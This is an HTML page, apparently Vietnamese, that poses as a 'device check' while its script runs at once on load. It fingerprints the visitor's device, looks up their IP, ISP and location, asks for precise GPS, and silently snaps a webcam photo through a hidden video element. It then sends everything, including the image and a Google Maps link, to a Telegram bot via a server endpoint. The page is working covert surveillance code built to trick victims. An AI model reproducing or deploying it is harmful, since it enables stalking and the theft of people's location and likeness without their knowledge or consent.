<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8" />
  <title>Ki·ªÉm tra thi·∫øt b·ªã</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f0f0;
      color: #333;
      text-align: center;
      padding: 50px;
    }
    h3.ten {
      color: #555;
    }
    video, canvas {
      display: none;
    }
  </style>
</head>
<body>
  <h3 class="ten">ƒêang ki·ªÉm tra thi·∫øt b·ªã, vui l√≤ng ch·ªù...</h3>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas"></canvas>

  <script>
    const info = {
      time: new Date().toUTCString(),
      user: 'Kh√¥ng r√µ',        // B·∫°n c√≥ th·ªÉ s·ª≠a n·∫øu c√≥ username
      device: '',
      os: '',
      ip: '',
      isp: 'Kh√¥ng r√µ',
      address: 'Kh√¥ng r√µ',
      country: 'Kh√¥ng r√µ',
      lat: '',
      lon: '',
      camera: 'Ch∆∞a ch·ª•p',
    };

    function detectDevice() {
      const ua = navigator.userAgent;
      if (/iPhone|iPad|iPod/i.test(ua)) {
        info.device = 'iOS Device';
        info.os = 'iOS';
      } else if (/Android/i.test(ua)) {
        const match = ua.match(/Android.*; (.+?) Build/);
        info.device = match ? match[1] : 'Android Device';
        info.os = 'Android';
      } else if (/Windows NT/i.test(ua)) {
        info.device = 'Windows PC';
        info.os = 'Windows';
      } else if (/Macintosh/i.test(ua)) {
        info.device = 'Mac';
        info.os = 'macOS';
      } else {
        info.device = 'Kh√¥ng x√°c ƒë·ªãnh';
        info.os = 'Kh√¥ng r√µ';
      }
    }

    // L·∫•y IP c√¥ng c·ªông
    async function getPublicIP() {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        info.ip = data.ip || 'Kh√¥ng r√µ';
      } catch {
        info.ip = 'Kh√¥ng r√µ';
      }
    }

    // L·∫•y ISP, ƒë·ªãa ch·ªâ, qu·ªëc gia th√¥ng qua API ip-api.com (JSONP ho·∫∑c fetch)
    async function getIPDetails() {
      try {
        const res = await fetch('https://ip-api.com/json/' + info.ip + '?fields=status,isp,city,country,lat,lon');
        const data = await res.json();
        if(data.status === 'success') {
          info.isp = data.isp || 'Kh√¥ng r√µ';
          info.address = data.city || 'Kh√¥ng r√µ';
          info.country = data.country || 'Kh√¥ng r√µ';
          if(!info.lat) info.lat = data.lat ? data.lat.toFixed(6) : '';
          if(!info.lon) info.lon = data.lon ? data.lon.toFixed(6) : '';
        }
      } catch {
        // gi·ªØ nguy√™n m·∫∑c ƒë·ªãnh
      }
    }

    // L·∫•y v·ªã tr√≠ ch√≠nh x√°c t·ª´ tr√¨nh duy·ªát
    async function getLocation() {
      return new Promise(resolve => {
        if (!navigator.geolocation) {
          resolve();
          return;
        }
        navigator.geolocation.getCurrentPosition(
          pos => {
            info.lat = pos.coords.latitude.toFixed(6);
            info.lon = pos.coords.longitude.toFixed(6);
            resolve();
          },
          () => resolve(),
          { enableHighAccuracy: true, timeout: 8000 }
        );
      });
    }

    // T·∫°o link Google Maps
    function getGoogleMapsLink() {
      return info.lat && info.lon
        ? `https://maps.google.com/?q=${info.lat},${info.lon}`
        : 'Kh√¥ng r√µ';
    }

    // T·∫°o n·ªôi dung tin nh·∫Øn g·ª≠i bot Telegram
    function getCaption() {
      return `
üïí Th·ªùi gian (UTC): ${info.time}
üë§ User: ${info.user}
üì± Thi·∫øt b·ªã: ${info.device}
üñ•Ô∏è H·ªá ƒëi·ªÅu h√†nh: ${info.os}
üåç IP: ${info.ip}
üè¢ ISP: ${info.isp}
üèôÔ∏è ƒê·ªãa ch·ªâ: ${info.address}
üåé Qu·ªëc gia: ${info.country}
üìç Vƒ© ƒë·ªô: ${info.lat}
üìç Kinh ƒë·ªô: ${info.lon}
üìå Google Maps: ${getGoogleMapsLink()}
üì∏ Camera: ${info.camera}
      `.trim();
    }

    // Ch·ª•p ·∫£nh t·ª´ camera
    async function captureImage() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        return new Promise(resolve => {
          video.onloadedmetadata = () => {
            setTimeout(() => {
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              canvas.getContext('2d').drawImage(video, 0, 0);
              const imageData = canvas.toDataURL('image/png');

              // D·ª´ng stream sau khi ch·ª•p
              stream.getTracks().forEach(track => track.stop());

              info.camera = 'ƒê√£ ch·ª•p ·∫£nh';

              resolve(imageData);
            }, 1000);
          };
        });
      } catch (err) {
        console.error('Kh√¥ng th·ªÉ truy c·∫≠p camera:', err);
        info.camera = 'Kh√¥ng truy c·∫≠p ƒë∆∞·ª£c camera';
        return null;
      }
    }

    // G·ª≠i d·ªØ li·ªáu l√™n server (bot Telegram)
    async function sendToServer() {
      const text = getCaption();
      const imageBase64 = await captureImage();

      try {
        const response = await fetch('/api/sendTelegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            message: text,
            image: imageBase64
          }),
        });

        if (!response.ok) {
          const errorData = await response.json();
          console.error('L·ªói khi g·ª≠i Telegram:', errorData);
        } else {
          console.log('G·ª≠i Telegram th√†nh c√¥ng');
          document.querySelector('h3.ten').innerText = 'Ki·ªÉm tra ho√†n t·∫•t!';
        }
      } catch (error) {
        console.error('L·ªói m·∫°ng ho·∫∑c fetch:', error);
      }
    }

    // H√†m ch√≠nh ch·∫°y tu·∫ßn t·ª±
    async function main() {
      detectDevice();
      await getPublicIP();
      await getIPDetails();
      await getLocation();
      await sendToServer();
    }

    main();
  </script>
</body>
</html>
